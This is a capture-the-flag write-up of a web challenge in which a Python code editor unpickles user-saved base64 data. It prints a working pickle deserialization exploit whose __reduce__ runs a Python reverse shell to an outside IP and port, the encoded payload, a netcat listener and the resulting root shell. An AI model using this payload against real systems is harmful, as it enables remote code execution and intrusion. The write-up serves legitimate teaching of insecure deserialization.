---
title: Coding Practices 🥒
description: A web challenge about unsafe Python pickle deserialization hidden inside a code editor.
date: 2026-05-11 15:27 +/-TTTT
categories: [CTF Writeups, DDC]
tags: [DDC, Web Exploitation, Python, Pickle, Deserialization]
---

{: .prompt-info }
> This challenge was solved by a human 🤓


## 🗒️ Challenge Description

> Enjoy my little online python editor. You can write your code with syntax highlighting and save it for later. Of course, you cant run your code on my machine :)
>
> `http://codingpractices.cfire`

## 🧭 Scope

- Target: `http://codingpractices.cfire`
- Category: Web exploitation
- Focus: Insecure deserialization with Python `pickle`
- Goal: Get code execution and recover the flag

## 🌐 First Look

The challenge website is a simple Python playground. It lets the user write Python code with syntax highlighting and save it on the server for later editing.

At first glance, the description tries to reassure us that our code cannot be executed on the server:

> Of course, you can't run your code on my machine :)

Which is... an interesting statement :P


## 💾 Saving Code

The interesting functionality is the save/load mechanism. The editor stores our code so it can be reopened later, but the saved representation is not just plain text.

The application uses:

- `pickle` to serialize and deserialize the saved editor state.
- `base64` to encode that serialized data for storage/transport.

That is the whole vulnerability. Python's `pickle` format is not safe for untrusted input. If the server calls `pickle.loads()` on attacker-controlled data, an attacker can craft a payload that executes code during deserialization.

Man i love pickles 🥒 Try them in a burger or on a hotdog.

## 🧨 Pickle RCE

To exploit this, we can create a Python object with a custom `__reduce__()` method. When the object is unpickled, Python uses the returned callable and arguments to reconstruct the object. If we return something like `subprocess.getoutput`, the server calls it during deserialization.

For generating reverse shell one-liners, I usually use [revshells.com](https://www.revshells.com). It is super useful because you can quickly choose the shell type, set your IP/port, and copy a payload that fits the situation.

Here is the payload generator:

```python
import pickle, os, base64, subprocess

class RCE:
    def __reduce__(self):
        return (
            subprocess.getoutput,
            ("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.0.240.254\",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'",)
        )

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

The generated base64 value is then used as the saved editor data. When the application loads it, it decodes the base64, unpickles the payload, and executes the reverse shell command.

In this case, the IP points through the CTF WireGuard VPN to my local machine, where I have a listener waiting to catch the shell.

The generated payload is:

```text
gAWVrgAAAAAAAACMCnN1YnByb2Nlc3OUjAlnZXRvdXRwdXSUk5SMi3B5dGhvbjMgLWMgJ2ltcG9ydCBvcyxwdHksc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjEwLjAuMjQwLjI1NCIsOTAwMSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigic2giKSeUhZRSlC4=
```

## 🐚 Reverse Shell

Before loading the malicious saved data, start a listener:

```bash
$ nc -lvnp 9001
```

Then replace the saved editor data with the malicious base64 payload and load it in the application.

Once the server deserializes it, the reverse shell connects back:

```bash
$ nc -lvnp 9001
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## 🚩 Flag

After poking around the server for a bit, i ended up finding the flag in the environment variables:

```bash
$ env
FLAG=DDC{M4YB3-1LL-ST4Y-0FF-P1CKL35-N3XT-T1M3}
```

## 🤔 Why the payload works

One detail that confused me at first was why the server loaded my base64 payload directly, instead of saving it as normal editor text and encoding it again. I dug around the remote instance to read the source code.

The reason is the save logic. When code is submitted, the server first checks whether the input is valid base64:

```python
try:
    b64decode(bytes(code_content, encoding="UTF-8"))
    content = bytes(code_content, encoding="UTF-8")
except Exception:
    content = b64encode(pickle.dumps(code_content))
```

If the input is valid base64, the server assumes it is already saved data and writes it directly to `save.dat`. If it is not valid base64, the server pickles the text and base64-encodes it first.

On load, the server always does the dangerous part:

```python
file_decoded = b64decode(file_content)
data = pickle.loads(file_decoded)
```

So by submitting a valid base64-encoded pickle payload, we make the server store our payload unchanged. Then, when the page is loaded again, the server decodes it and unpickles it.

## 🤓 TL;DR

1. The site is a Python code editor that saves code for later.
2. The saved editor state is serialized with Python `pickle` and encoded with base64.
3. The server loads attacker-controlled pickle data, so we can abuse `__reduce__()` for code execution.
4. The malicious pickle calls `subprocess.getoutput()` with a Python reverse shell one-liner.
5. Base64-encode the pickle, submit it as saved editor data, load it, and catch the reverse shell.
